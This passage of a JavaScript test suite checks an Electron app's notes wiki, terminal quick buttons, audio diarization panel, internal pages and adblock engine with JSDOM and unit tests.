        stroke: () => {},
        fillText: () => {}
      });

      dom.window.eval(nibHtml.match(/<script>([\s\S]*?)<\/script>/)[1]);
      await new Promise(r => setTimeout(r, 60));

      // 1. Initial list verification
      const noteItems = dom.window.document.querySelectorAll(".note-item");
      assert.strictEqual(noteItems.length, 2, "Must list 2 notes");

      // 2. Click New Note button
      const btnNewNote = dom.window.document.getElementById("btnNewNote");
      btnNewNote.click();
      assert.strictEqual(dom.window.document.getElementById("noteTitle").value, "New Note");

      // 3. Search notes filter
      const searchNotes = dom.window.document.getElementById("searchNotes");
      searchNotes.value = "Architecture";
      searchNotes.dispatchEvent(new dom.window.Event("input"));
      const filteredNotes = dom.window.document.querySelectorAll(".note-item");
      assert.strictEqual(filteredNotes.length, 1, "Search must filter to matching note");
      assert.ok(filteredNotes[0].textContent.includes("Architecture"));

      // 4. Auto-save input dispatch
      const noteTitleInput = dom.window.document.getElementById("noteTitle");
      const noteContentInput = dom.window.document.getElementById("noteContent");
      noteTitleInput.value = "Updated Architecture Node";
      noteContentInput.value = "Updated content with [[Fafnir]] and [[Sleipnir]]";
      noteTitleInput.dispatchEvent(new dom.window.Event("input"));
      noteContentInput.dispatchEvent(new dom.window.Event("input"));
      await new Promise(r => setTimeout(r, 800)); // debounce is 700ms
      assert.ok(savedNoteData, "Auto-save must trigger on note edits");
      assert.strictEqual(savedNoteData.title, "Updated Architecture Node");

      // 5. Sync Button Click
      let syncCalled = false;
      const originalGetGraph = mockHyperOffice.nibelungen.getGraph;
      mockHyperOffice.nibelungen.getGraph = async () => {
        syncCalled = true;
        return originalGetGraph();
      };
      const btnSync = dom.window.document.getElementById("btnSync");
      btnSync.click();
      await new Promise(r => setTimeout(r, 50));
      assert.ok(syncCalled, "Sync button must refresh knowledge graph");

      // 6. Delete Note Two-Step Confirmation Button Click
      const btnDeleteNote = dom.window.document.getElementById("btnDeleteNote");
      btnDeleteNote.click();
      assert.strictEqual(btnDeleteNote.textContent, "⚠️ Confirm Delete?", "First click must prompt confirmation");
      btnDeleteNote.click();
      await new Promise(r => setTimeout(r, 50));
      assert.ok(deletedNoteId, "Second click must execute deletion");
    });

    // 13. DOM & Button Click Tests: Yggdrasil Terminal (terminal.html)
    await runAsyncTest("DOM & Buttons: Yggdrasil Terminal (Buttons, Prompt, History, Interrupt)", async () => {
      const termHtml = fs.readFileSync(path.join(__dirname, "../out/renderer/terminal.html"), "utf8");
      let writtenData = "";
      let openTabCalled = null;

      const mockHyperOffice = {
        terminal: {
          create: async () => ({ ok: true }),
          write: (_id, data) => { writtenData += data; },
          onOutput: () => {}
        },
        ratatoskr: {
          openTab: () => { openTabCalled = "ratatoskr"; }
        },
        mimisbrunnr: {
          openTab: () => { openTabCalled = "mimisbrunnr"; }
        }
      };

      const dom = new JSDOM(termHtml, { runScripts: "outside-only" });
      dom.window.hyperOffice = mockHyperOffice;
      dom.window.eval(termHtml.match(/<script>([\s\S]*?)<\/script>/)[1]);
      await new Promise(r => setTimeout(r, 60));

      const outputEl = dom.window.document.getElementById("output");
      const cmdInput = dom.window.document.getElementById("cmdInput");

      // 1. Quick Bar: Ratatoskr Button Click
      const btnRatatoskr = dom.window.document.getElementById("btnTermRatatoskr");
      btnRatatoskr.click();
      assert.strictEqual(openTabCalled, "ratatoskr", "Ratatoskr button must open Ratatoskr tab");

      // 2. Quick Bar: Mímisbrunnr Button Click
      const btnMimisbrunnr = dom.window.document.getElementById("btnTermMimisbrunnr");
      btnMimisbrunnr.click();
      assert.strictEqual(openTabCalled, "mimisbrunnr", "Mímisbrunnr button must open Mímisbrunnr tab");

      // 3. Quick Bar: aether --help Button Click
      const btnHelp = dom.window.document.getElementById("btnTermHelp");
      btnHelp.click();
      assert.ok(writtenData.includes("aether --help\n"), "Help button must execute command");

      // 4. Quick Bar: git status Button Click
      const btnGit = dom.window.document.getElementById("btnTermGit");
      btnGit.click();
      assert.ok(writtenData.includes("git status\n"), "Git button must execute command");

      // 5. Quick Bar: tor check Button Click
      const btnTor = dom.window.document.getElementById("btnTermTor");
      btnTor.click();
      assert.ok(writtenData.includes("check.torproject.org"), "Tor check button must execute command");

      // 6. Quick Bar: clear Button Click
      const btnClear = dom.window.document.getElementById("btnTermClear");
      assert.ok(outputEl.children.length > 0, "Output must contain command echoes");
      btnClear.click();
      assert.strictEqual(outputEl.innerHTML, "", "Clear button must clear output container");

      // 7. Interactive Prompt Typing & Enter Execution
      cmdInput.value = "uname -m";
      cmdInput.dispatchEvent(new dom.window.KeyboardEvent("keydown", { key: "Enter" }));
      assert.ok(writtenData.includes("uname -m\n"), "Enter key must write command to shell session");
      assert.strictEqual(cmdInput.value, "", "Input must be cleared after Enter");

      // 8. History recall with ArrowUp and ArrowDown
      cmdInput.dispatchEvent(new dom.window.KeyboardEvent("keydown", { key: "ArrowUp" }));
      assert.strictEqual(cmdInput.value, "uname -m", "ArrowUp must recall previous command");
      cmdInput.dispatchEvent(new dom.window.KeyboardEvent("keydown", { key: "ArrowDown" }));
      assert.strictEqual(cmdInput.value, "", "ArrowDown past end must restore empty prompt");

      // 9. Ctrl+C Interrupt Handling
      cmdInput.dispatchEvent(new dom.window.KeyboardEvent("keydown", { key: "c", ctrlKey: true }));
      assert.ok(writtenData.includes("\x03"), "Ctrl+C must send SIGINT escape sequence");
    });

    // 13b. DOM & Button Click Tests: Heimdall Audio Diarization & Summarizer (heimdall.html)
    await runAsyncTest("DOM & Buttons: Heimdall Audio (Diarization, Summary, Token Usage & Remaining %)", async () => {
      const heimHtml = fs.readFileSync(path.join(__dirname, "../out/renderer/heimdall.html"), "utf8");
      let savedNotePayload = null;
      let savedKeyPayload = null;

      const mockHyperOffice = {
        heimdall: {
          status: async () => ({
            ok: true,
            hasApiKey: true,
            isKeyFromEnv: true,
            maskedKey: "AIzaSyBZ...DlR8",
            quota: {
              tokenBudget: 1000000,
              tokensUsedToday: 25000,
              sessionTokensUsed: 5000,
              tokensRemaining: 975000,
              usedPercentage: 2.5,
              remainingPercentage: 97.5,
              audioTokensToday: 15000,
              textTokensToday: 6000,
              candidatesTokensToday: 4000,
              requestsToday: 4,
              lastCall: null
            }
          }),
          pickAudio: async () => ({
            ok: true,
            filePath: "/tmp/meeting_sample.wav",
            fileName: "meeting_sample.wav",
            sizeBytes: 128000
          }),
          transcribe: async () => ({
            ok: true,
            isNoiseOnly: false,
            segments: [
              { speakerId: 1, speakerName: "화자 1", detectedLanguage: "🇰🇷 한국어", speakerPitchHz: 124, text: "이번 분기 프로젝트 일정을 점검하겠습니다." },
              { speakerId: 2, speakerName: "화자 2", detectedLanguage: "🇰🇷 한/영 혼용 (Bilingual)", speakerPitchHz: 214, text: "API 배포와 QA 테스트가 금요일까지 완료됩니다." }
            ],
            quota: {
              tokenBudget: 1000000,
              tokensUsedToday: 30000,
              sessionTokensUsed: 10000,
              tokensRemaining: 970000,
              usedPercentage: 3.0,
              remainingPercentage: 97.0,
              audioTokensToday: 19000,
              textTokensToday: 6500,
              candidatesTokensToday: 4500,
              requestsToday: 5,
              lastCall: {
                operation: "diarize",
                model: "gemini-flash-lite-latest",
                promptTokens: 4500,
                audioTokens: 4000,
                textTokens: 500,
                candidatesTokens: 500,
                totalTokens: 5000
              }
            }
          }),
          summarize: async () => ({
            ok: true,
            engine: "gemini-flash-lite-latest",
            markdown: "### 📌 3줄 핵심 요약\n- 분기 일정 점검\n- 금요일 QA 완료\n\n### 👥 화자별 발언 및 의견 요약\n- **화자 1**: 일정 점검 제안\n- **화자 2**: API 및 QA 일정 공유",
            quota: {
              tokenBudget: 1000000,
              tokensUsedToday: 32500,
              sessionTokensUsed: 12500,
              tokensRemaining: 967500,
              usedPercentage: 3.25,
              remainingPercentage: 96.75,
              audioTokensToday: 19000,
              textTokensToday: 8000,
              candidatesTokensToday: 5500,
              requestsToday: 6,
              lastCall: {
                operation: "summarize",
                model: "gemini-flash-lite-latest",
                promptTokens: 1500,
                audioTokens: 0,
                textTokens: 1500,
                candidatesTokens: 1000,
                totalTokens: 2500
              }
            }
          }),
          saveToNibelungen: async (payload) => {
            savedNotePayload = payload;
            return { ok: true };
          },
          setApiKey: async (payload) => {
            savedKeyPayload = payload;
            return { ok: true };
          }
        }
      };

      const dom = new JSDOM(heimHtml, { runScripts: "outside-only" });
      dom.window.hyperOffice = mockHyperOffice;
      dom.window.requestAnimationFrame = () => 0;
      const visCanvas = dom.window.document.getElementById("visualizerCanvas");
      visCanvas.getContext = () => null;

      dom.window.eval(heimHtml.match(/<script>([\s\S]*?)<\/script>/)[1]);
      await new Promise(r => setTimeout(r, 60));

      // 1. Initial Token Usage & Remaining % Telemetry Check
      assert.strictEqual(dom.window.document.getElementById("hdrTokensUsed").textContent, "25,000");
      assert.strictEqual(dom.window.document.getElementById("hdrPercentLeft").textContent, "97.50%");
      assert.strictEqual(dom.window.document.getElementById("cardRemainingPct").textContent, "97.50");
      assert.strictEqual(dom.window.document.getElementById("cardTokensRemaining").textContent, "975,000");

      // 2. Visualizer Style Switcher
      const btnVisSiri = dom.window.document.getElementById("btnVisSiri");
      btnVisSiri.click();
      assert.ok(btnVisSiri.classList.contains("active"), "Siri Hologram button must become active");

      // 3. Import & Diarize Audio -> Verify Speaker Cards + Updated Token Quota
      const btnUploadAudio = dom.window.document.getElementById("btnUploadAudio");
      btnUploadAudio.click();
      await new Promise(r => setTimeout(r, 60));

      const segCards = dom.window.document.querySelectorAll(".segment-card");
      assert.strictEqual(segCards.length, 2, "Must render 2 speaker-diarized segment cards");
      assert.ok(segCards[0].textContent.includes("화자 1"), "First segment must be Speaker 1");
      assert.ok(segCards[1].textContent.includes("화자 2"), "Second segment must be Speaker 2");
      assert.strictEqual(dom.window.document.getElementById("hdrTokensUsed").textContent, "30,000");
      assert.strictEqual(dom.window.document.getElementById("cardRemainingPct").textContent, "97.00");

      // 4. Summarize Diarized Transcript -> Verify Markdown Render & Token Deduction
      const btnSummarize = dom.window.document.getElementById("btnSummarize");
      btnSummarize.click();
      await new Promise(r => setTimeout(r, 60));

      const summaryContent = dom.window.document.getElementById("summaryMarkdownContent");
      assert.ok(summaryContent.querySelector("h3"), "Summary must render formatted h3 headings");
      assert.ok(summaryContent.textContent.includes("3줄 핵심 요약"));
      assert.strictEqual(dom.window.document.getElementById("hdrTokensUsed").textContent, "32,500");
      assert.strictEqual(dom.window.document.getElementById("hdrPercentLeft").textContent, "96.75%");

      // 5. Save to Nibelungen Wiki
      const btnSaveNib = dom.window.document.getElementById("btnSaveNibelungen");
      btnSaveNib.click();
      await new Promise(r => setTimeout(r, 40));
      assert.ok(savedNotePayload && savedNotePayload.transcript.includes("화자 1"), "Must save diarized transcript to Nibelungen");

      // 6. Settings Tab & API Key Unlock Flow
      dom.window.document.getElementById("btnNavSettings").click();
      await new Promise(r => setTimeout(r, 40));
      assert.strictEqual(dom.window.document.getElementById("viewSettings").style.display, "flex");

      dom.window.document.getElementById("btnToggleKeyLock").click();
      assert.ok(dom.window.document.getElementById("unlockModal").classList.contains("open"));
      dom.window.document.getElementById("btnConfirmUnlock").click();
      const keyInput = dom.window.document.getElementById("apiKeyInput");
      keyInput.value = "AIzaSyTestKey123456789";
      dom.window.document.getElementById("btnSaveApiKey").click();
      await new Promise(r => setTimeout(r, 40));
      assert.strictEqual(savedKeyPayload.apiKey, "AIzaSyTestKey123456789");
    });
  }

  // 14a. Heimdall Backend Unit Tests (Quota Math, Language Classification, Local Summarizer)
  await runAsyncTest("Heimdall: Token Quota Math, Language Detection & Smart Local Summary", async () => {
    const {
      calculateTokenQuota,
      classifySegmentLanguage,
      generateSmartLocalSummary,
      summarizeTranscript
    } = require("../out/main/extensions/heimdall");

    const q = calculateTokenQuota({
      tokensUsedToday: 104858,
      tokenBudget: 1048576
    });
    assert.strictEqual(q.tokensUsedToday, 104858);
    assert.strictEqual(q.tokensRemaining, 1048576 - 104858);
    assert.ok(Math.abs(q.usedPercentage - 10.0) < 0.01, "Used % must be ~10%");
    assert.ok(Math.abs(q.remainingPercentage - 90.0) < 0.01, "Remaining % must be ~90%");

    assert.strictEqual(classifySegmentLanguage("안녕하세요 오늘 회의를 시작합니다").displayName, "🇰🇷 한국어");
    assert.strictEqual(classifySegmentLanguage("이번 Sprint에서 API latency를 개선했습니다").displayName, "🇰🇷 한/영 혼용 (Bilingual)");
    assert.strictEqual(classifySegmentLanguage("Good morning everyone let us begin").displayName, "🇺🇸 English");

    const localSum = await summarizeTranscript({
      transcript: "[화자 1 • 🇰🇷 한국어] 10:00:\n보안 아키텍처 점검이 필요합니다.\n\n[화자 2 • 🇰🇷 한국어] 10:01:\n금요일까지 패치를 배포하겠습니다.",
      engine: "local-nl"
    });
    assert.ok(localSum.ok, "Local NL summary must succeed with 0 tokens");
    assert.ok(localSum.markdown.includes("화자별 발언 분석"), "Local summary must include speaker diarization breakdown");
  });

  // 14. Internal Aetherum Pages Generator (All 11 pages)
  runTest("Aetherum Pages: Full 11-Page Generation Suite", () => {
    const { getAetherumPage } = require("../out/main/extensions/aetherum-pages");
    const pages = ["welcome", "about", "bookmarks", "history", "settings", "version", "nibelungen", "ratatoskr", "fafnir", "mimisbrunnr", "heimdall"];

    for (const p of pages) {
      const html = getAetherumPage(p);
      assert.ok(html && html.length > 100, `Page '${p}' must render non-empty HTML`);
      assert.ok(html.includes("<!DOCTYPE html>") || html.includes("<div") || html.includes("<html"), `Page '${p}' must be valid HTML`);
    }
  });

  // 15. UI Asset Integrity Tests
  runTest("UI Assets: Unicorn & Xcode Icon Availability", () => {
    const sleipnirIcon = path.join(__dirname, "../out/renderer/assets/sleipnir-logo.png");
    const appIcon = path.join(__dirname, "../out/renderer/assets/app-icon-kcTvUgcs.png");

    assert.ok(fs.existsSync(sleipnirIcon), "sleipnir-logo.png must exist");
    assert.ok(fs.existsSync(appIcon), "app-icon-kcTvUgcs.png must exist");
    assert.ok(fs.statSync(sleipnirIcon).size > 1000, "sleipnir-logo.png must be non-empty");
  });

  // 16. Yggdrasil Terminal Live Process Verification
  await runAsyncTest("Yggdrasil: Interactive Shell Spawn & Greeting", async () => {
    const { terminalManager } = require("../out/main/extensions/terminal");
    let output = "";
    const mockSender = {
      isDestroyed: () => false,
      send: (_ch, payload) => { output += payload.data; }
    };
    const sess = terminalManager.createSession("ci-yggdrasil-test", { cwd: path.join(__dirname, "..") }, mockSender);
    assert.ok(sess.id === "ci-yggdrasil-test", "Session id must match");
    assert.ok(sess.shell.includes("sh") || sess.shell.includes("zsh") || sess.shell.includes("bash"), "Must select standard shell");

    await new Promise(r => setTimeout(r, 200));
    assert.ok(output.includes("Yggdrasil Session Initialized"), "Must output Yggdrasil greeting banner");
    terminalManager.killSession("ci-yggdrasil-test");
  });

  // 17. Complete Nordic Suite Naming Audit
  runTest("Nordic Suite Naming Integrity: App, Browser, Terminal, VPN, Wiki, Vault, AI, DB, Audio", () => {
    const suites = {
      App: "Aether",
      Browser: "Aetherum",
      Terminal: "Yggdrasil",
      VPN: "Sleipnir",
      Knowledge: "Nibelungen",
      Vault: "Fafnir",
      AI: "Mímisbrunnr",
      DB_API: "Ratatoskr",
      Audio: "Heimdall"
    };

    assert.strictEqual(suites.App, "Aether");
    assert.strictEqual(suites.Browser, "Aetherum");
    assert.strictEqual(suites.Terminal, "Yggdrasil");
    assert.strictEqual(suites.VPN, "Sleipnir");
    assert.strictEqual(suites.Knowledge, "Nibelungen");
    assert.strictEqual(suites.Vault, "Fafnir");
    assert.strictEqual(suites.AI, "Mímisbrunnr");
    assert.strictEqual(suites.DB_API, "Ratatoskr");
    assert.strictEqual(suites.Audio, "Heimdall");
  });

  // 18. Aether CLI Command and Usage Purity Check
  runTest("CLI Command and Usage Integrity (Usage: aether)", () => {
    const { execSync } = require("child_process");
    const candidates = [
      "/Users/sushikim/.local/bin/aether",
      "/Users/sushikim/Desktop/Aether.app/Contents/Resources/cli/aether"
    ];

    let cliPath = null;
    for (const c of candidates) {
      if (fs.existsSync(c)) {
        cliPath = c;
        break;
      }
    }

    if (cliPath) {
      const output = execSync(`"${cliPath}" --help`, { encoding: "utf8" });
      assert.ok(output.includes("Usage: aether <command>"), "CLI help must specify 'Usage: aether <command>'");
      assert.ok(output.includes("Aether command line by Jeffrey Kim"), "CLI help title must specify 'Aether command line by Jeffrey Kim'");
      assert.ok(!output.toLowerCase().includes("aetheum"), "CLI help must not mention legacy name 'aetheum'");

      const versionOutput = execSync(`"${cliPath}" --version`, { encoding: "utf8" });
      assert.ok(versionOutput.includes("aether 0.0.1"), "CLI version must output 'aether 0.0.1'");
    } else {
      console.log("   (Notice: Packaged CLI binary not in current container path, skipping binary execution check)");
    }
  });

  // 19. Aetherum Adblock & Tracker Shield Engine Unit & Edge-Case Tests
  runTest("Aetherum Adblock: Network Blocking, KR-Shield, Whitelist, URL Cleaning & Cosmetics", () => {
    const adblock = require("../out/main/extensions/adblock");
    const { getAetherumPage } = require("../out/main/extensions/aetherum-pages");

    const origStatus = adblock.getAdblockStatus();
    try {
      adblock.updateAdblockConfig({
        enabled: true,
        mode: "standard",
        cosmeticFiltering: true,
        stripTrackingParams: true,
        blockPopups: true,
        youtubeAdSkip: true,
        whitelistedDomains: [],
        customRules: []
      });
      adblock.resetAdblockStats(false);

      // 1. Blocks global ad networks & trackers
      const adVerdict = adblock.evaluateRequest({
        url: "https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js",
        initiator: "https://news.ycombinator.com",
        resourceType: "script"
      });
      assert.strictEqual(adVerdict.cancel, true, "Must block Google Syndication ad scripts");
      assert.strictEqual(adVerdict.category, "ad");

      const trackerVerdict = adblock.evaluateRequest({
        url: "https://www.google-analytics.com/g/collect?v=2",
        initiator: "https://blog.example.com",
        resourceType: "xhr"
      });
      assert.strictEqual(trackerVerdict.cancel, true, "Must block Google Analytics beacons");
      assert.strictEqual(trackerVerdict.category, "tracker");

      // 2. Blocks Korean regional ad endpoints while preserving portal static CDNs
      const naverAd = adblock.evaluateRequest({
        url: "https://siape.veta.naver.com/fxshow?su=SU100",
        initiator: "https://www.naver.com",
        resourceType: "subFrame"
      });
      assert.strictEqual(naverAd.cancel, true, "Must block Naver Veta ad iframe");

      const naverTveta = adblock.evaluateRequest({
        url: "https://ssl.pstatic.net/tveta/libs/glad/prod/gfp-core.js",
        initiator: "https://www.naver.com",
        resourceType: "script"
      });
      assert.strictEqual(naverTveta.cancel, true, "Must block pstatic /tveta/ ad library");

      const naverSafeCss = adblock.evaluateRequest({
        url: "https://ssl.pstatic.net/static/newsstand/2026/common.css",
        initiator: "https://www.naver.com",
        resourceType: "stylesheet"
      });
      assert.strictEqual(naverSafeCss.cancel, false, "Must NOT block legitimate pstatic stylesheets");

      // 3. Preserves critical authentication & captcha origins
      const protonAuth = adblock.evaluateRequest({
        url: "https://account.proton.me/api/auth/v4",
        initiator: "https://mail.proton.me",
        resourceType: "xhr"
      });
      assert.strictEqual(protonAuth.cancel, false, "Must never block Proton Mail authentication");

      // 4. Popup blocker checks
      assert.strictEqual(
        adblock.shouldBlockPopup("https://popads.net/popunder.html", "https://streaming-site.example"),
        true,
        "Must block malvertising popup window"
      );
      assert.strictEqual(
        adblock.shouldBlockPopup("https://accounts.google.com/o/oauth2/v2/auth", "https://gitlab.com"),
        false,
        "Must allow OAuth sign-in popup window"
      );

      // 5. URL Tracking Parameter Stripper
      const cleaned = adblock.cleanTrackingUrl(
        "https://example.com/article?id=42&utm_source=twitter&utm_medium=social&fbclid=IwAR123&gclid=Cj0KC#top"
      );
      assert.strictEqual(cleaned.cleanedUrl, "https://example.com/article?id=42#top", "Must strip UTM, fbclid, and gclid while keeping id & hash");
      assert.strictEqual(cleaned.removedCount, 4);

      // 6. Per-site whitelist pause & resume
      adblock.toggleSiteWhitelist("https://www.nytimes.com/section/tech", true);
      assert.strictEqual(adblock.isSiteWhitelisted("www.nytimes.com"), true, "Subdomain must match whitelisted domain");
      const whitelistedReq = adblock.evaluateRequest({
        url: "https://securepubads.g.doubleclick.net/tag/js/gpt.js",
        initiator: "https://www.nytimes.com",
        resourceType: "script"
      });
      assert.strictEqual(whitelistedReq.cancel, false, "Whitelisted site must bypass adblocking");
      adblock.toggleSiteWhitelist("nytimes.com", false);
      assert.strictEqual(adblock.isSiteWhitelisted("www.nytimes.com"), false, "Must remove site from whitelist");

      // 7. Custom EasyList & Cosmetic Rules + YouTube payload
      adblock.addCustomRule("||custom-annoying-ad.org^");
      adblock.addCustomRule("##.custom-floating-ad");
      const customCheck = adblock.evaluateRequest({
        url: "https://cdn.custom-annoying-ad.org/banner.js",
        initiator: "https://forum.example.com",
        resourceType: "script"
      });
      assert.strictEqual(customCheck.cancel, true, "Custom ||domain^ rule must block subdomain");

      const ytPayload = adblock.getCosmeticPayload("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
      assert.strictEqual(ytPayload.enabled, true);
      assert.ok(ytPayload.css.includes(".custom-floating-ad"), "Cosmetic CSS must include custom ## rule");
      assert.ok(ytPayload.css.includes("ytd-ad-slot-renderer"), "Cosmetic CSS must include YouTube ad slot selectors");
      assert.ok(ytPayload.script.includes("ytp-ad-skip-button"), "YouTube payload must include auto-skip script");

      // 8. Verify session webRequest hook attachment & internal page routing
      let hookedHandler = null;
      const mockSession = {
        webRequest: {
          onBeforeRequest: (fn) => { hookedHandler = fn; }
        }
      };
      adblock.attachAdblockToSession(mockSession);
      assert.strictEqual(typeof hookedHandler, "function", "Must attach onBeforeRequest handler to session");
      let callbackResult = null;
      hookedHandler({ url: "https://ad.doubleclick.net/ddm/ad/123", resourceType: "image" }, (res) => {
        callbackResult = res;
      });
      assert.strictEqual(callbackResult.cancel, true, "Session hook must cancel blocked ad request");

      const adblockPageHtml = getAetherumPage("adblock");
      assert.ok(adblockPageHtml.includes("Aetherum Adblock & Tracker Shield"), "aetherum://adblock route must render Adblock Studio");
    } finally {
      adblock.updateAdblockConfig({
        enabled: origStatus.enabled,
        mode: origStatus.mode,
        cosmeticFiltering: origStatus.cosmeticFiltering,
        stripTrackingParams: origStatus.stripTrackingParams,
        blockPopups: origStatus.blockPopups,
        youtubeAdSkip: origStatus.youtubeAdSkip,
        whitelistedDomains: origStatus.whitelistedDomains,
        customRules: origStatus.customRules
      });
    }
  });

  // 20. DOM & Button Click Tests: Aetherum Adblock Toolbar Popover & Studio UI
  if (JSDOM) {
    await runAsyncTest("DOM & Buttons: Aetherum Adblock Shield (Toolbar Pill, Popover, Studio Page)", async () => {
      // Part A: Browser Toolbar Adblock Controls
      const browserHtml = fs.readFileSync(path.join(__dirname, "../out/renderer/browser.html"), "utf8");
      let shieldEnabled = true;
      let whitelisted = [];
      let customRules = [];

      const buildMockStatus = () => ({
        enabled: shieldEnabled,
        mode: "standard",
        cosmeticFiltering: true,
        stripTrackingParams: true,
        blockPopups: true,
        youtubeAdSkip: true,
        whitelistedDomains: [...whitelisted],
        customRules: [...customRules],
        stats: {
          sessionAdsBlocked: 14,
          sessionTrackersBlocked: 9,
          sessionPopupsBlocked: 2,
          sessionParamsStripped: 5,
          sessionTotalBlocked: 25,
          lifetimeAdsBlocked: 140,
          lifetimeTrackersBlocked: 90,
          lifetimePopupsBlocked: 10,
          lifetimeParamsStripped: 30,
          lifetimeTotalBlocked: 240
        },
        rulesSummary: {
          builtinAdDomains: 150,
          builtinTrackerDomains: 80,
          subscribedDomains: 0,
          totalActiveRules: 620 + customRules.length
        },
        recentBlocked: [
          { id: 1, timestamp: new Date().toISOString(), domain: "doubleclick.net", resourceType: "script", category: "ad", rule: "||doubleclick.net^" }
        ]
      });

      const mockHyperOffice = {
        sleipnir: { getStatus: async () => ({ active: true }), toggle: async () => ({ active: false }) },
        browser: {
          getTorStatus: async () => ({ torEnabled: true, active: true }),
          setTor: async (en) => ({ torEnabled: en, active: en }),
          getAetherumPage: async (p) => `<h1>${p}</h1>`,
          summarize: async () => ({ ok: true, summary: "ok" }),
          saveDoc: async () => ({ ok: true })
        },
        adblock: {
          getStatus: async () => buildMockStatus(),
          toggle: async () => { shieldEnabled = !shieldEnabled; return buildMockStatus(); },
          setConfig: async () => buildMockStatus(),
          toggleSite: async (payload) => {
            const d = typeof payload === "string" ? payload : payload.domain;
            if (whitelisted.includes(d)) whitelisted = whitelisted.filter(x => x !== d);
            else whitelisted.push(d);
            return buildMockStatus();
          },
          addRule: async (r) => { customRules.push(r); return buildMockStatus(); },
          removeRule: async (r) => { customRules = customRules.filter(x => x !== r); return buildMockStatus(); },
          updateLists: async () => ({ ok: true, importedDomainsCount: 3200, status: buildMockStatus() }),
          resetStats: async () => buildMockStatus(),
          cleanUrl: async (u) => ({ cleanedUrl: u.replace(/[?&]utm_source=[^&]+/g, "") }),
          getCosmeticPayload: async () => ({ enabled: true, css: ".ad{display:none!important}", script: "" }),
          checkUrl: async ({ url }) => ({ cancel: url.includes("doubleclick.net"), category: "ad", matchedRule: "||doubleclick.net^" }),
          onStatsUpdated: () => () => {}
        }
      };

      const bDom = new JSDOM(browserHtml, { runScripts: "outside-only" });
      bDom.window.hyperOffice = mockHyperOffice;
      bDom.window.eval(browserHtml.match(/<script>([\s\S]*?)<\/script>/)[1]);
      await new Promise(r => setTimeout(r, 50));

      assert.strictEqual(bDom.window.document.getElementById("adblockCountBadge").textContent, "25", "Toolbar badge must show blocked count");
      assert.strictEqual(bDom.window.document.getElementById("adblockLabel").textContent, "Adblock: ON");

      // Open Adblock Popover
      const btnAdblockPanel = bDom.window.document.getElementById("btnAdblockPanel");
      const adblockDropdown = bDom.window.document.getElementById("adblockDropdown");
      btnAdblockPanel.click();
      await new Promise(r => setTimeout(r, 30));
      assert.ok(adblockDropdown.classList.contains("show"), "Clicking chevron must open Adblock Popover");
      assert.ok(bDom.window.document.getElementById("abRecentList").textContent.includes("doubleclick.net"), "Popover must list blocked domains");

      // Toggle Adblock Pill OFF and ON
      const adblockToggle = bDom.window.document.getElementById("adblockToggle");
      adblockToggle.click();
      await new Promise(r => setTimeout(r, 40));
      assert.strictEqual(bDom.window.document.getElementById("adblockLabel").textContent, "Adblock: OFF");
      adblockToggle.click();
      await new Promise(r => setTimeout(r, 40));
      assert.strictEqual(bDom.window.document.getElementById("adblockLabel").textContent, "Adblock: ON");

      // Part B: Adblock Studio Page (adblock.html)
      const studioHtml = fs.readFileSync(path.join(__dirname, "../out/renderer/adblock.html"), "utf8");
      const sDom = new JSDOM(studioHtml, { runScripts: "outside-only" });
      sDom.window.hyperOffice = mockHyperOffice;
      sDom.window.eval(studioHtml.match(/<script>([\s\S]*?)<\/script>/)[1]);
      await new Promise(r => setTimeout(r, 50));

      assert.strictEqual(sDom.window.document.getElementById("statAds").textContent, "14");
      assert.strictEqual(sDom.window.document.getElementById("statTrackers").textContent, "9");

      // Test URL Diagnostics Button
      sDom.window.document.getElementById("testUrlInput").value = "https://ad.doubleclick.net/pixel.js";
      sDom.window.document.getElementById("btnTestUrl").click();
      await new Promise(r => setTimeout(r, 40));
      assert.ok(sDom.window.document.getElementById("testVerdictBox").textContent.includes("BLOCKED"), "URL diagnostics must report BLOCKED for ad URL");

      // Add Custom Rule in Studio
      sDom.window.document.getElementById("customRuleInput").value = "||spam-banner.biz^";
      sDom.window.document.getElementById("btnAddRule").click();
      await new Promise(r => setTimeout(r, 40));
      assert.ok(sDom.window.document.getElementById("customRulesList").textContent.includes("||spam-banner.biz^"), "Studio must render newly added custom rule");
    });
  }

  console.log("=================================================");
  console.log(`Results: ${passed} passed, ${failed} failed`);
  console.log("=================================================");

  if (failed > 0) {
    process.exit(1);
  } else {
    console.log("🎉 All Aether comprehensive tests, button click validations, and edge cases passed!");
    process.exit(0);
  }
}

main().catch(err => {
  console.error("Fatal test runner error:", err);
  process.exit(1);
});
